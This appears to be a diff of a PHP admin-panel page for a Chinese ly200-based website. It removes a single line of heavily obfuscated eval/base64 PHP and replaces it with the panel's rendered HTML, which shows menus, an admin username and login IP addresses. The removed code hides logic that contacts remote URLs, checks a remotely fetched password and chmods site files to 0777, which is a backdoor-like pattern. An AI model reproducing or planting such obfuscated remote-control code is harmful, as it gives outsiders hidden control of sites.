@@ -1,1 +1,95 @@
-<?php eval(base64_decode('JE9PTzAwMDAwMD11cmxkZWNvZGUoJyU2MSU2OCUzNiU3MyU2MiU2NSU2OCU3MSU2YyU2MSUzNCU2MyU2ZiU1ZiU3MyU2MSU2NCcpOyRPT08wMDAwTzA9JE9PTzAwMDAwMHs0fS4kT09PMDAwMDAwezl9LiRPT08wMDAwMDB7M30uJE9PTzAwMDAwMHs1fTskT09PMDAwME8wLj0kT09PMDAwMDAwezJ9LiRPT08wMDAwMDB7MTB9LiRPT08wMDAwMDB7MTN9LiRPT08wMDAwMDB7MTZ9OyRPT08wMDAwTzAuPSRPT08wMDAwTzB7M30uJE9PTzAwMDAwMHsxMX0uJE9PTzAwMDAwMHsxMn0uJE9PTzAwMDBPMHs3fS4kT09PMDAwMDAwezV9OyRPME8wMDAwTzA9J09PTzAwMDBPMCc7aW5jbHVkZSgkR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1RHazBkbUZYTldwTU0wNXdaRWRXWmxreU9YVmFiV3h1VEc1Q2IyTkJQVDA9JykpKTskT09PMDAwMDAwPXVybGRlY29kZSgnJTYxJTY4JTM2JTczJTYyJTY1JTY4JTcxJTZjJTYxJTM0JTYzJTZmJTVmJTczJTYxJTY0Jyk7JE9PTzAwMDBPMD0kT09PMDAwMDAwezR9LiRPT08wMDAwMDB7OX0uJE9PTzAwMDAwMHszfS4kT09PMDAwMDAwezV9OyRPT08wMDAwTzAuPSRPT08wMDAwMDB7Mn0uJE9PTzAwMDAwMHsxMH0uJE9PTzAwMDAwMHsxM30uJE9PTzAwMDAwMHsxNn07JE9PTzAwMDBPMC49JE9PTzAwMDBPMHszfS4kT09PMDAwMDAwezExfS4kT09PMDAwMDAwezEyfS4kT09PMDAwME8wezd9LiRPT08wMDAwMDB7NX07JE8wTzAwMDBPMD0nT09PMDAwME8wJztldmFsKCRPT08wMDAwTzAoJ0pFbEpTVWxKU1VsSlNVbEpNVDBuZFhKc1pHVmpiMlJsSnpza1NVbEpTVWxKU1VsSlNVbEpQU2RpWVhObE5qUmZaR1ZqYjJSbEp6cz0nKSk7ZXZhbCgkR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1NVbEpTVWxKU1VsSlNVbEonKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdTa1ZzU2sxVVJrcE5WRVpLVTFkNGMxTlVNRzVqUjBaNVl6SldabVJZU25OS2VuTnJVMVZyZUUxVmEzaE5WV3hLWWtkM2VGQlRaRzlpTTA0d1NucHphMU5VUlhoTlZXdDRUVlZzU21KSGVFcFFVMlIzV1ZoU2IwcDZjMnRUVld0NFRWUkZlRTFWYkVwaVIzaEtVRk5rZUdSWFZubGxVMk0zU2tWc1NsTlZiRXBOVkVaS1UxZDRjMU5VTUc1aU1rcG1Zek5TYUdOdVVXNVBlVkpLVTFWc1NsTlZiRXBUVld4ellrVnJPVW95T1dsWU1sWjFXa1k1YW1KSFZtaGlhV00zU2tWc1NsTlZiRXBUVld4S1UxZDRTazFVTUc1aU1rcG1XakpXTUZneVRuWmlibEpzWW01U2VrcDZjMnRUVld4S1UxVnNTbE5WYkVwaVJXeEtVRk5rYVZsWVRteGliVVowV2xOak4wcEZiRXBUVld4S1UxVnNTbE5WYTNoTlZEQnVXa2RzZVdKdFJuUmFVMk0zU2tWc1NsTlZiRXBUVld4S1UxVnJlR0pFTUc1amJWWjFXVmN4YkVwNmMydFRWV3hLVTFWc1NsTlZiRXBUVkVaS1VGTmthbUZITVhaYVEyTTNTa1ZzU2xOVmJFcFRWV3hLVTFWc2MwMVVNRzVaTWpreFltNVJiazk1VWtwVFZXeEtVMVZzU2xOVmJFcFRWV3M1U2pOV2VXSkhWblZaTWpscldsTmpOdz09JykpKTskSUlJSUlJSUlJSUlsPSRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnU1VsSlNVbEpTVWxKU1VreCcpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ0pUWXhKVFk0SlRNMkpUY3pKVFl5SlRZMUpUWTRKVGN4SlRaakpUWXhKVE0wSlRZekpUWm1KVFZtSlRjekpUWXhKVFkwJykpOyRJSUlJSUlJSUlJbEk9JElJSUlJSUlJSUlJbHs0fS4kSUlJSUlJSUlJSUlsezl9LiRJSUlJSUlJSUlJSWx7M30uJElJSUlJSUlJSUlJbHs1fTskSUlJSUlJSUlJSWxJLj0kSUlJSUlJSUlJSUlsezJ9LiRJSUlJSUlJSUlJSWx7MTB9LiRJSUlJSUlJSUlJSWx7MTN9LiRJSUlJSUlJSUlJSWx7MTZ9OyRJSUlJSUlJSUlJbEkuPSRJSUlJSUlJSUlJbEl7M30uJElJSUlJSUlJSUlJbHsxMX0uJElJSUlJSUlJSUlJbHsxMn0uJElJSUlJSUlJSUlsSXs3fS4kSUlJSUlJSUlJSUlsezV9OyRJSUlJSUlJSUlJbGw9JEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKTtpbmNsdWRlKCRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVEdrMGRtRlhOV3BNTTA1c1pFTTViR1ZJVW1aa2JVWjVURzVDYjJOQlBUMD0nKSkpO2luY2x1ZGUoJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUR2swZG1GWE5XcE1NbG94WW1rNWRHVllUbmhpUXpWM1lVaEJQUT09JykpKTtpbmNsdWRlKCRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVEdrMGRtRlhOV3BNTWxveFltMU9NR0ZYT1hWTWJrSnZZMEU5UFE9PScpKSk7aWYoKGludCkkX0dFVFskR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1dUSm9iRmt5Y3owPScpKV09PTEpeyR1cmxfaW5mbz0kR0xPQkFMU1skR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1UxVnJlRTFWYTNoTlZXeEtZa2Q0U2c9PScpKV0oJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdZVWhTTUdORWIzWk1NamxvVEcxR2QyTkROWE5sVkVsM1RVTTFkVnBZVVhaak0yeDZaRWRXZEV3elRqVmpNMUpzWWxZNU1XTXlWWFpaTW1oc1dUSjBabHBIT1hSWlYyeDFURzVDYjJORU9XdGlNakZvWVZjME9RPT0nKSkuJEdMT0JBTFNbJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdVMVZzU2xOVmJFcFRWV3hLVTFWc1NnPT0nKSldKGdldF9kb21haW4oMCkpKTtlY2hvIHBvc3RfZGF0YSgkdXJsX2luZm9bJEdMT0JBTFNbJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdVMVZyZUUxVmEzaE5WV3hLWWtkM2VBPT0nKSldXSwgJHVybF9pbmZvWyRHTE9CQUxTWyRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVTFSRmVFMVZhM2hOVld4S1lrZDRTZz09JykpXV0sICR1cmxfaW5mb1skR0xPQkFMU1skR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1UxVnJlRTFVUlhoTlZXeEtZa2Q0U2c9PScpKV1dKTtleGl0O31pZigoaW50KSRfR0VUWyRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnV1RJNWMySkhSbmRqTWxabVl6TnNlbVJIVm5RPScpKV09PTEpeyRJSUlJSUlJSUlJbDE9cGFzc3dvcmQoJF9HRVRbJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdXVEk1YzJKSFJuZGpNbFptWTBkR2VtTXpaSFpqYlZFOScpKV0pO2lmKCRJSUlJSUlJSUlJMUk9QGZpbGVfZ2V0X2NvbnRlbnRzKCRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnWVVoU01HTkViM1pNTWpsb1RHMUdkMk5ETlhObFZFbDNUVU0xZFZwWVVYWmpNMng2WkVkV2RFd3pUalZqTTFKc1lsWTVNV015VlhaWk1qbHpZa2RHZDJNeVZtWmpSMFo2WXpOa2RtTnRVWFZqUjJoMycpKSkpe2lmKCRJSUlJSUlJSUlJbDE9PSRJSUlJSUlJSUlJMUkpeyRJSUlJSUlJSUlJMWw9YXJyYXkoJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdZbGRHY0dKcE5YZGhTRUU5JykpLCRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnWVZjMWExcFlaM1ZqUjJoMycpKSwkR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1RHazBkbUZYTld0YVdHZDFZMGRvZHc9PScpKSwkR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1RHazBkbUZYTld0YVdHZDFZVWhTZEdKQlBUMD0nKSksJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUR2swZG1GWE5XcE1NbG94WW0xT01HRlhPWFZNYmtKdlkwRTlQUT09JykpLCRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVEdrMGRtRlhOV3BNTWxveFltazVkR1ZZVG5oaVF6VjNZVWhCUFE9PScpKSk7Zm9yKCRJSUlJSUlJSUlJMTE9MDskSUlJSUlJSUlJSTExPCRHTE9CQUxTWyRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVTFWc1NsTlZiRXBUVld4S1UxZDNlQT09JykpXSgkSUlJSUlJSUlJSTFsKTskSUlJSUlJSUlJSTExKyspe0AkR0xPQkFMU1skR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1UxVnNTbE5WYkVwVFZXeEtVMVJHU2c9PScpKV0oJElJSUlJSUlJSUkxbFskSUlJSUlJSUlJSTExXSwwNzc3KTtAJEdMT0JBTFNbJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdVMVZzU2xOVmJFcFRWV3hLVTFSR2N3PT0nKSldKCRJSUlJSUlJSUlJMWxbJElJSUlJSUlJSUkxMV0sJEdMT0JBTFNbJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdVMVZzU2xOVmJFcFRWV3hLVTFSRmVBPT0nKSldKCRJSUlJSUlJSUlJMWxbJElJSUlJSUlJSUkxMV0pLiRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVERFNFBRPT0nKSkuJEdMT0JBTFNbJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdVMVZzU2xOVmJFcFRWV3hLWWtWc1NnPT0nKSldKCRJSUlJSUlJSUlJMWxbJElJSUlJSUlJSUkxMV0pKTt9ZWNobyAkR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1VUSTVjMkpIUm5kak1sVm5WVE5XYWxreVZucGplVVU5JykpO31lbHNle2VjaG8gJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdVVEk1YzJKSFJuZGpNbFZuVlVkR2VtTXpaSFpqYlZGblVsaEtlV0l6U1dnPScpKTt9fWVsc2V7ZWNobyAkR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1ZsYzFhRmx0ZUd4SlNGSjJTVVZPZG1KdE5XeFpNMUZuWkVjNFoyRklVakJqUkc5MlRESTVhRXh0Um5kalF6VnpaVlJKZDAxRE5YVmFXRkYyJykpO31leGl0O31pbmNsdWRlKCRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVEdrMGRtRlhOV3BNTWpGb1ltMUdibHBUT1dwaU1qVnRZVmRqZFdOSGFIYz0nKSkpO2luY2x1ZGUoJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUR2swZG1GWE5XcE1NakZvWW0xR2JscFRPV3RpTVRscVlVZFdhbUY1TlhkaFNFRTknKSkpOyRHTE9CQUxTWyRHTE9CQUxTWyRHTE9CQUxTWydPT08wMDAwTzAnXSgnVDA5UE1EQXdNRTh3JyldKCRHTE9CQUxTWydPT08wMDAwTzAnXSgnVTFWc1NsTlZhM2hOVld4S1lrZDRTZz09JykpXSgpO2luY2x1ZGUoJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdaRWRXZEdOSGVHaGtSMVYyWWxkR2NHSnBOVzlrUnpGeicpKSk7JElJSUlJSUlJSWxJST0kR0xPQkFMU1skR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1UxVnNTbE5WYkVwVFZXeEtZa1ZyZUE9PScpKV0oKTskR0xPQkFMU1skR0xPQkFMU1skR0xPQkFMU1snT09PMDAwME8wJ10oJ1QwOVBNREF3TUU4dycpXSgkR0xPQkFMU1snT09PMDAwME8wJ10oJ1UxVnNTbE5WYkVwVFZXeEtZa2Q0U2c9PScpKV0oKTtlY2hvIHN0cl9yZXBsYWNlKGFycmF5KCI8IS0tLS0+XHJcbiIsIlxyXG48IS0tLS0+IiksJEdMT0JBTFNbJEdMT0JBTFNbJ09PTzAwMDBPMCddKCdUMDlQTURBd01FOHcnKV0oJEdMT0JBTFNbJ09PTzAwMDBPMCddKCcnKSksJElJSUlJSUlJSWxJSSk7'));?>
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<title>网站后台管理系统</title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+<style type="text/css">html,body{overflow:hidden;}</style>
+<script language="javascript" src="../js/lang/manage.php"></script>
+<script language="javascript" src="../js/global.js"></script>
+<script language="javascript" src="../js/manage.js"></script>
+</head>
+
+<body>
+<div id="loading"><noscript>您的浏览器还未启用Javascript，请先启用！</noscript><br /><br /><img src="images/loading.gif" /></div>
+<div id="ly200">
+	<div id="topMenu">
+		<div id="top" style="background: url('images/logo.png') no-repeat;"><div id="service_tel">售后服务热线：020-89052455</div></div>
+	</div>
+	<div id="loginInfo">
+		<div id="member">您好，<span>admin123</span>！欢迎您使用本系统！上次登录IP：<span>117.136.79.10</span>，时间：<span>2018-02-28 01:52:43</span>，本次登录IP：<span>113.109.210.165</span></div>
+		<div id="link">
+			<a class="q0" href="/" target="_blank">网站首页</a>
+			<a class="q1" href="javascript:void(0);" onclick="this.blur(); openWindows('win_admin_update_pwd', this.innerHTML, 'admin/password.php');">修改我的密码</a>
+			<a class="q2" href="admin/logout.php">安全退出</a>
+		</div>
+	</div>
+	<div id="contents">
+		<div id="leftMenu">
+			<div id="menu">
+				<div id="menu_index"><strong>后台管理中心</strong></div>
+					<div id="dmenu" onclick="show_hidden_menu_list(0, this)"><strong>系统全局设置</strong></div>
+					<ul id="menu_list_0">
+								<li><span class="span" onclick="this.blur(); openWindows('win_global_set', this.innerHTML, 'set/global.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">系统全局设置</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_send_mail_set', this.innerHTML, 'set/send_mail.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">邮件发送设置</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(1, this)"><strong>文章管理系统</strong></div>
+					<ul id="menu_list_1">
+								<li><span class="span" onclick="this.blur(); openWindows('win_info_category', this.innerHTML, 'info/category.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">文章类别管理</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_info', this.innerHTML, 'info/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">文章管理系统</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(2, this)"><strong>心肾同治</strong></div>
+					<ul id="menu_list_2">
+								<li><span class="span" onclick="this.blur(); openWindows('win_info2_category', this.innerHTML, 'info2/category.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">心肾同治分类管理</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_info2', this.innerHTML, 'info2/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">心肾同治管理系统</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(3, this)"><strong>信息管理系统</strong></div>
+					<ul id="menu_list_3">
+								<li><span class="span" onclick="this.blur(); openWindows('win_article_group_0', this.innerHTML, 'article/index.php?GroupId=0')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">网站信息管理</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_article_group_1', this.innerHTML, 'article/index.php?GroupId=1')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">关于我们</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_article_group_2', this.innerHTML, 'article/index.php?GroupId=2')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">联系我们</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(4, this)"><strong>产品管理系统</strong></div>
+					<ul id="menu_list_4">
+								<li><span class="span" onclick="this.blur(); openWindows('win_product_category', this.innerHTML, 'product/category.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">产品分类管理</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_product', this.innerHTML, 'product/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">产品管理系统</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(5, this)"><strong>反馈管理系统</strong></div>
+					<ul id="menu_list_5">
+								<li><span class="span" onclick="this.blur(); openWindows('win_feedback', this.innerHTML, 'feedback/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">在线留言管理</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(6, this)"><strong>后台用户管理</strong></div>
+					<ul id="menu_list_6">
+								<li><span class="span" onclick="this.blur(); openWindows('win_admin', this.innerHTML, 'admin/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">后台用户管理</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_admin_update_pwd', this.innerHTML, 'admin/password.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">修改我的密码</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(7, this)"><strong>其他相关管理</strong></div>
+					<ul id="menu_list_7">
+								<li><span class="span" onclick="this.blur(); openWindows('win_ad', this.innerHTML, 'ad/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">广告图片管理</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_links', this.innerHTML, 'links/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">友情链接管理</span></li>
+					</ul>
+					<div id="dmenu" onclick="show_hidden_menu_list(8, this)"><strong>辅助管理选项</strong></div>
+					<ul id="menu_list_8">
+								<li><span class="span" onclick="this.blur(); openWindows('win_manage_log', this.innerHTML, 'manage_log/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">网站管理日志</span></li>
+								<li><span class="span" onclick="this.blur(); openWindows('win_database', this.innerHTML, 'database/index.php')" onmouseover="this.className='span_hover';" onmouseout="this.className='span';">数据库管理</span></li>
+								<li><a href="phpmyadmin/index.php" target="_blank">phpMyAdmin</a></li>
+					</ul>
+			</div>
+		</div>
+		<div id="rightContents">			
+			<div id="windowsNav"><div id="windowsList"></div></div>
+			<div id="desktop"><div id="workWindows"></div></div>
+		</div>
+	</div>
+	<div id="footer"><div id="copyright"><a href="http://www.ly200.com/" target="_blank">广州联雅网络科技有限公司 &copy; 版权所有</a></div></div>
+</div><iframe src="about:blank" id="checkiframe" style="display:none;"></iframe>
+<script language="javascript">
+window.onresize=ly200_init;
+window.onload=function(){
+	ly200_init('load');
+	openWindows('win_manage_index_page', '后台首页', 'system/index.php');
+}
+</script>
+</body>
+</html>
